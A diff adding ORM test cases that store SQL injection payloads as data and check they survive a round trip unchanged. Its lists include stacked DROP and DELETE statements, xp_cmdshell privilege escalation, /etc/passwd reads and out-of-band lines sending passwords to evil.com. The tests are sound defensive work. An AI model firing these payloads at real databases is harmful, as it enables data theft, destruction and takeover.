@@ -1018,3 +1018,645 @@ def test_query_error_recovery(order_fixtures):
     all_orders = Order.query().where(Order.c.user_id == user.id).all()
     assert len(all_orders) == 1
     assert all_orders[0].total_amount == Decimal('100')
+
+
+# ============================================================
+# Second-order injection immunity (二阶注入安全性)
+# Verify that values retrieved from DB can be safely re-used
+# in subsequent queries without causing injection.
+# ============================================================
+
+def test_second_order_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='second_order', email='second_order@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "'; DROP TABLE users--",
+        "admin' OR '1'='1",
+        "' UNION SELECT * FROM orders--",
+        "1' AND 1=1--",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=f"2ND-{i:03d}",
+            total_amount=Decimal(f'{i+1}0.00'), status=payload,
+        ).save()
+
+        # First query: retrieve the payload
+        result = Order.query().where(Order.c.order_number == f"2ND-{i:03d}").one()
+        retrieved_status = result.status
+
+        # Second query: use retrieved value as a query parameter
+        second_result = Order.query().where(Order.c.status == retrieved_status).all()
+        assert len(second_result) >= 1
+        for r in second_result:
+            assert r.status == retrieved_status
+
+    # Data integrity: normal query still works
+    normal = Order(user_id=user.id, order_number='2ND-NORMAL',
+                   total_amount=Decimal('999'), status='normal')
+    normal.save()
+    found = Order.query().where(Order.c.order_number == '2ND-NORMAL').all()
+    assert len(found) == 1
+    assert found[0].status == 'normal'
+
+
+# ============================================================
+# Unicode normalization injection bypass (Unicode 归一化注入绕过)
+# Verify that Unicode variants that normalize to SQL keywords
+# are treated as data, not SQL.
+# ============================================================
+
+def test_unicode_normalization_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='unicode_inject', email='unicode_inject@example.com', age=30)
+    user.save()
+
+    # Unicode lookalike/homoglyph variants of SQL keywords
+    payloads = [
+        "ＮＵＬＬ",            # Fullwidth NULL
+        "ＳＥＬＥＣＴ",        # Fullwidth SELECT
+        "ＤＲＯＰ",            # Fullwidth DROP
+        "ｏｒ １＝１",          # Fullwidth "or 1=1"
+        "аdmin",              # Cyrillic 'а' instead of Latin 'a'
+        "SELЕCT",             # Cyrillic 'Е' instead of Latin 'E'
+        "DRОР",               # Cyrillic 'Р' instead of Latin 'P'
+        "\uff34\uff32\uff35\uff45",  # Fullwidth TRUE
+        "NULL",               # Plain NULL keyword as data
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=payload,
+            total_amount=Decimal(f'{i+1}0.00'), status='pending',
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == payload).all()
+        assert len(result) == 1, f"Failed to find Unicode payload '{payload}'"
+        assert result[0].order_number == payload
+
+
+# ============================================================
+# Case variation injection immunity (大小写变体注入安全性)
+# Verify that case variations of SQL keywords are treated as data.
+# ============================================================
+
+def test_case_variation_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='case_vary', email='case_vary@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "SeLeCt",
+        "DrOp",
+        "UnIoN",
+        "Or 1=1",
+        "aNd 1=1",
+        "dRoP tAbLe",
+        "InSeRt InTo",
+        "UpDaTe SeT",
+        "DeLeTe FrOm",
+        "cReAtE tAbLe",
+        "aLtEr TaBlE",
+        "TrUnCaTe",
+        "ExEc",
+        "ShUtDoWn",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=payload,
+            total_amount=Decimal(f'{i+1}0.00'), status='pending',
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == payload).all()
+        assert len(result) == 1, f"Case variant payload '{payload}' not found"
+        assert result[0].order_number == payload
+
+    # All payloads retrievable via in_()
+    all_payloads = Order.query().where(Order.c.order_number.in_(payloads)).all()
+    assert len(all_payloads) == len(payloads)
+
+
+# ============================================================
+# Comment style variation injection (注释变体注入安全性)
+# Test all known SQL comment styles as data values.
+# ============================================================
+
+def test_comment_style_variation_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='comment_var', email='comment_var@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "admin'--",
+        "admin'#",
+        "admin'-- ",
+        "admin'--+",
+        "admin'/*",
+        "admin'//",
+        "admin';",
+        "admin' -- comment",
+        "admin'# comment",
+        "admin'/**/",
+        "admin'/*!*/",
+        "admin'-- -",
+        "admin'--\t",
+        "admin'--\n",
+        "admin' --\r\n",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=payload,
+            total_amount=Decimal(f'{i+1}0.00'), status='pending',
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == payload).all()
+        assert len(result) == 1, f"Comment variant '{payload}' not found"
+        assert result[0].order_number == payload
+
+
+# ============================================================
+# Newline injection immunity (换行注入安全性)
+# Test various newline characters embedded in data.
+# ============================================================
+
+def test_newline_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='newline_inj', email='newline_inj@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "line1\nline2",
+        "line1\r\nline2",
+        "line1\rline2",
+        "before\n' OR '1'='1",
+        "'; DROP\nTABLE--",
+        "admin'--\nSELECT *",
+        "\nSELECT\n",
+        "foo\nbar\nbaz\n",
+        "multi\nline\ninjection\npayload",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=payload,
+            total_amount=Decimal(f'{i+1}0.00'), status='pending',
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == payload).all()
+        assert len(result) == 1, f"Newline payload '{payload!r}' not found"
+        assert result[0].order_number == payload
+
+
+# ============================================================
+# NULL byte injection immunity (NULL 字节注入安全性)
+# Test embedded null bytes in data values.
+# ============================================================
+
+def test_null_byte_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='nullbyte_inj', email='nullbyte_inj@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "admin\0' OR '1'='1",
+        "\0DROP TABLE users",
+        "before\0after",
+        "\0' UNION SELECT--",
+        "mid\0dle",
+        "\0\0\0",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=f"NB-{i:03d}",
+            total_amount=Decimal(f'{i+1}0.00'), status=payload,
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == f"NB-{i:03d}").all()
+        assert len(result) == 1
+        assert result[0].status == payload
+
+
+# ============================================================
+# Boolean-based blind injection immunity (布尔盲注安全性)
+# Test boolean logic injection patterns as data.
+# ============================================================
+
+def test_boolean_blind_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='bool_blind', email='bool_blind@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "1 AND 1=1",
+        "1 AND 1=2",
+        "1 OR 1=1",
+        "1 OR 1=2",
+        "1' AND '1'='1",
+        "1' AND '1'='2",
+        "' OR 1=1",
+        "' OR 1=2",
+        "' OR '1'='1",
+        "' OR '1'='2",
+        "x' AND 'x'='x",
+        "x' AND 'x'='y",
+        "1' OR '1'='1' /*",
+        "1' OR '1'='1'#",
+        "' OR 1=1 --",
+        "1' OR 1=1 --",
+        "admin' OR 1=1 --",
+        "admin' OR '1'='1' --",
+        "1' AND 1=1 UNION SELECT 1,2,3--",
+        "1' AND 1=2 UNION SELECT 1,2,3--",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=payload,
+            total_amount=Decimal(f'{i+1}0.00'), status='pending',
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == payload).all()
+        assert len(result) == 1, f"Boolean payload '{payload}' not found"
+        assert result[0].order_number == payload
+
+
+# ============================================================
+# DBMS-specific injection payloads (数据库特定注入)
+# Test vendor-specific injection syntax as data values.
+# ============================================================
+
+def test_dbms_specific_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='dbms_inject', email='dbms_inject@example.com', age=30)
+    user.save()
+
+    # MySQL-specific
+    mysql_payloads = [
+        "1' /*!*/",
+        "1' /*!50000*/",
+        "1' INTO OUTFILE '/tmp/out.txt'--",
+        "1' INTO DUMPFILE '/tmp/out.txt'--",
+        "1' LOAD_FILE('/etc/passwd')--",
+        "1' AND BENCHMARK(1000000,MD5(1))--",
+        "1' AND SLEEP(5)--",
+        "' AND 1=1 UNION SELECT @@version,@@hostname--",
+        "1' AND 1=1 UNION SELECT user(),database()--",
+        "1' UNION SELECT tname,cname FROM inf_schema--",
+    ]
+
+    # PostgreSQL-specific
+    pg_payloads = [
+        "1' AND (SELECT pg_sleep(5))--",
+        "1' AND (SELECT current_database())--",
+        "1' AND (SELECT version())--",
+        "1' UNION SELECT NULL::text,NULL::text--",
+        "1' UNION SELECT current_schema,current_user--",
+        "1' UNION SELECT tname FROM inf_schema--",
+        "1' UNION SELECT tname,cname FROM inf_schema--",
+        "1' OR 1::text=1::text--",
+        "' OR 'a'::text='a'--",
+    ]
+
+    # MSSQL-specific
+    mssql_payloads = [
+        "1' WAITFOR DELAY '0:0:5'--",
+        "1' WAITFOR TIME '23:00:00'--",
+        "1' EXEC xp_cmdshell 'dir'--",
+        "1' EXEC sp_configure 'show advanced options', 1--",
+        "1' EXEC sp_configure 'xp_cmdshell', 1--",
+        "1' UNION SELECT @@version,@@servername--",
+        "1' UNION SELECT db_name(),user_name()--",
+        "1' UNION SELECT name,type FROM sys.tables--",
+        "1'; EXEC sp_addlogin 'hacker','pass'--",
+        "1'; EXEC sp_addsrvrolemember 'hacker','sysadmin'--",
+    ]
+
+    # Oracle-specific
+    oracle_payloads = [
+        "1' UNION SELECT NULL FROM dual--",
+        "1' UNION SELECT banner FROM v$version--",
+        "1' UNION SELECT table_name,NULL FROM all_tables--",
+        "1' UNION SELECT col,NULL FROM all_tab_cols--",
+        "1' UNION SELECT user,NULL FROM all_users--",
+        "1' UNION SELECT gname,NULL FROM global_name--",
+        "1' OR UTL_HTTP.request('http://evil.com')--",
+        "1' OR UTL_INADDR.get_host_name('127.0.0.1')--",
+        "1'AND extractvalue(1,concat(1,SELECT@@ver))--",
+        "1'AND updatexml(1,concat(1,(SELECT@@version)),1)--",
+    ]
+
+    # UNION-based
+    union_payloads = [
+        "' UNION SELECT 1,2,3,4--",
+        "' UNION ALL SELECT 1,2,3,4--",
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' UNION SELECT * FROM users--",
+        "UNION SELECT*FROM(SELECT 1)a,(SELECT 2)b--",
+        "1'UNION SELECT col FROM inf_schema WHERE table='u'",
+        "UNION SELECT @@version,@@servername--",
+        "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
+        "1' UNION SELECT 1,2,3,4,5--",
+        "1' UNION SELECT NULL UNION SELECT NULL--",
+    ]
+
+    all_payloads = (
+        mysql_payloads + pg_payloads + mssql_payloads
+        + oracle_payloads + union_payloads
+    )
+
+    for i, payload in enumerate(all_payloads):
+        Order(
+            user_id=user.id, order_number=f"DBMS-{i:04d}",
+            total_amount=Decimal('10'), status=payload,
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == f"DBMS-{i:04d}").all()
+        assert len(result) == 1
+        assert result[0].status == payload
+
+
+# ============================================================
+# LIKE wildcard injection immunity (LIKE 通配符注入安全性)
+# Test that LIKE wildcards in data don't cause injection.
+# ============================================================
+
+def test_like_wildcard_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='like_inject', email='like_inject@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "%",
+        "_",
+        "%_%",
+        "%%%",
+        "__",
+        "%admin%",
+        "_admin_",
+        "%%admin%%",
+        "%' OR '1'='1",
+        "_' OR '1'='1",
+        "%' UNION SELECT--",
+        "%%' DROP TABLE--",
+        "'%'",
+        "'_'",
+        "admin%",
+        "admin_",
+        "%' AND 1=1--",
+        "%' ORDER BY 1--",
+        "%' UNION SELECT @@version--",
+        "%' WAITFOR DELAY '0:0:5'--",
+        "escape_test\\%",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=payload,
+            total_amount=Decimal(f'{i+1}0.00'), status='pending',
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == payload).all()
+        assert len(result) == 1, f"LIKE wildcard payload '{payload}' not found"
+        assert result[0].order_number == payload
+
+
+# ============================================================
+# Heavy query injection immunity (重型查询注入安全性)
+# Test heavy/complex injection patterns as data.
+# ============================================================
+
+def test_heavy_query_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='heavy_inject', email='heavy_inject@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "1'AND(SELECT COUNT(*)FROM inf_schema.columns)>0--",
+        "1'AND(SELECT COUNT(*)FROM inf_schema.tables)>0--",
+        "1'UNION SELECT GROUP_CONCAT(name)FROM sys--",
+        "1' AND (SELECT COUNT(*) FROM pg_class)--",
+        "1'UNION SELECT string_agg(tname)FROM pg_tables--",
+        "1' AND (SELECT COUNT(*) FROM sysobjects)--",
+        "1' AND (SELECT COUNT(*) FROM v$table)--",
+        "1' AND (SELECT COUNT(*) FROM all_objects)--",
+        "UNION SELECT col,table FROM inf_schema WHERE db()",
+        "1'AND(SELECT COUNT(*)FROM(SELECT 1)a)--",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=f"HVY-{i:03d}",
+            total_amount=Decimal(f'{i+1}0.00'), status=payload,
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == f"HVY-{i:03d}").all()
+        assert len(result) == 1
+        assert result[0].status == payload
+
+
+# ============================================================
+# Nested/in-band injection immunity (嵌套/带内注入安全性)
+# Test deeply nested SQL patterns in data values.
+# ============================================================
+
+def test_nested_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='nested_inj', email='nested_inj@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "1' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--",
+        "1' OR (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)--",
+        "'OR EXISTS(SELECT 1 FROM users WHERE u='admin')--",
+        "'OR EXISTS(SELECT 1 FROM inf_schema)--",
+        "1' AND IF(1=1,SLEEP(0),SLEEP(5))--",
+        "1' AND IF(1=2,SLEEP(0),SLEEP(5))--",
+        "' OR (SELECT 1 FROM (SELECT 1) a)--",
+        "'OR(SELECT 1 FROM (SELECT 1)a,(SELECT 2)b)--",
+        "1' UNION SELECT pwd FROM users WHERE 1=1--",
+        "1' UNION SELECT name FROM users LIMIT 1--",
+        "'OR EXISTS(SELECT 1 FROM orders)",
+        "1'UNION SELECT GROUP_CONCAT(name)FROM inf_sch--",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=f"NEST-{i:03d}",
+            total_amount=Decimal(f'{i+1}0.00'), status=payload,
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == f"NEST-{i:03d}").all()
+        assert len(result) == 1
+        assert result[0].status == payload
+
+
+# ============================================================
+# Out-of-band exfiltration injection immunity (带外注入安全性)
+# Test OOB channel payloads as data values.
+# ============================================================
+
+def test_out_of_band_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='oob_inject', email='oob_inject@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "1' EXEC xp_cmdshell 'curl http://evil.com/steal'--",
+        "1' EXEC xp_cmdshell 'nslookup evil.com'--",
+        "1' EXEC xp_cmdshell 'ping evil.com'--",
+        "1' OR UTL_HTTP.request('http://evil.com/?'||pwd)--",
+        "1' OR UTL_INADDR.get_host_name('evil.com')--",
+        "1' OR UTL_TCP.open_connection('evil.com',80)--",
+        "1' COPY (SELECT pwd) TO PROGRAM 'curl'--",
+        "1' OR LOAD_FILE(CONCAT('\\\\e',(SELECT pwd)))--",
+        "1' UNION SELECT LOAD_FILE('/etc/passwd')--",
+        "1' UNION SELECT pg_read_file('/etc/passwd')--",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=f"OOB-{i:03d}",
+            total_amount=Decimal(f'{i+1}0.00'), status=payload,
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == f"OOB-{i:03d}").all()
+        assert len(result) == 1
+        assert result[0].status == payload
+
+
+# ============================================================
+# Stacked query injection immunity (堆叠查询注入安全性)
+# Test multi-statement injection patterns as data.
+# ============================================================
+
+def test_stacked_query_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='stacked_inj', email='stacked_inj@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "1; DROP TABLE users",
+        "1; DELETE FROM orders",
+        "1; INSERT INTO users VALUES(1,'hack')",
+        "1; UPDATE users SET password='hacked'",
+        "1; SELECT * FROM users; SELECT * FROM orders",
+        "1; CREATE TABLE hacked(id INT)",
+        "1; ALTER TABLE users DROP COLUMN password",
+        "1; TRUNCATE TABLE orders",
+        "1; DROP DATABASE test",
+        "1; SHUTDOWN",
+        "' ; DROP TABLE users--",
+        "'; DROP TABLE users; SELECT 1; --",
+        "'; DELETE FROM orders WHERE '1'='1",
+        "'; UPDATE users SET admin=1 WHERE '1'='1",
+        "' ; INSERT INTO logs VALUES('injected'); --",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=f"STK-{i:03d}",
+            total_amount=Decimal(f'{i+1}0.00'), status=payload,
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == f"STK-{i:03d}").all()
+        assert len(result) == 1
+        assert result[0].status == payload
+
+
+# ============================================================
+# Encoding variation injection immunity (编码变体注入安全性)
+# Test various encoding tricks as data values.
+# ============================================================
+
+def test_encoding_variation_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='encode_inj', email='encode_inj@example.com', age=30)
+    user.save()
+
+    # Many of these will be tested as literal text in UTF-8; the point
+    # is that the roundtrip preserves them exactly as stored.
+    payloads = [
+        "admin%00",
+        "admin%27",
+        "admin%2527",
+        "admin%%271",
+        "admin\\u0027",
+        "admin\\x27",
+        "admin\\x00",
+        "admin\\\\'",
+        "admin\\' OR 1=1--",
+        "admin%c0%ae%c0%ae/",  # Overlong UTF-8 encoding
+        "admin%ef%bc%87",       # Fullwidth apostrophe
+        "admin%e2%80%99",       # Right single quotation mark (U+2019)
+        "admin\xc0\xae",        # Overlong /
+        "admin\xe0\x80\xaf",    # Overlong /
+        "admin\xf0\x80\x80\xae", # Overlong /
+        "admin\\' OR 1=1--",
+        "admin'' OR 1=1--",
+        "admin\"\" OR 1=1--",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=f"ENC-{i:03d}",
+            total_amount=Decimal(f'{i+1}0.00'), status=payload,
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == f"ENC-{i:03d}").all()
+        assert len(result) == 1
+        assert result[0].status == payload
+
+
+# ============================================================
+# Error-based injection immunity (报错注入安全性)
+# Test error-based injection payloads as data values.
+# ============================================================
+
+def test_error_based_injection_immunity(order_fixtures):
+    User, Order, OrderItem = order_fixtures
+
+    user = User(username='err_inject', email='err_inject@example.com', age=30)
+    user.save()
+
+    payloads = [
+        "1'AND extractvalue(1,concat(1,SELECT version()))--",
+        "1'AND updatexml(1,concat(1,SELECT database()),1)--",
+        "1'AND(SELECT COUNT(*)FROM inf_schema WHERE 1=1)--",
+        "1' AND (SELECT 1/0 FROM dual)--",
+        "1' OR convert(int,@@version)--",
+        "1' OR 1=CAST(@@version AS int)--",
+        "1' AND CONVERT(int,@@version)--",
+        "' OR 1=cols[1]--",
+        "1' AND (SELECT COUNT(*) FROM non_existent_table)--",
+        "1' UNION SELECT 1/0,2,3--",
+    ]
+
+    for i, payload in enumerate(payloads):
+        Order(
+            user_id=user.id, order_number=f"ERR-{i:03d}",
+            total_amount=Decimal(f'{i+1}0.00'), status=payload,
+        ).save()
+
+        result = Order.query().where(Order.c.order_number == f"ERR-{i:03d}").all()
+        assert len(result) == 1
+        assert result[0].status == payload
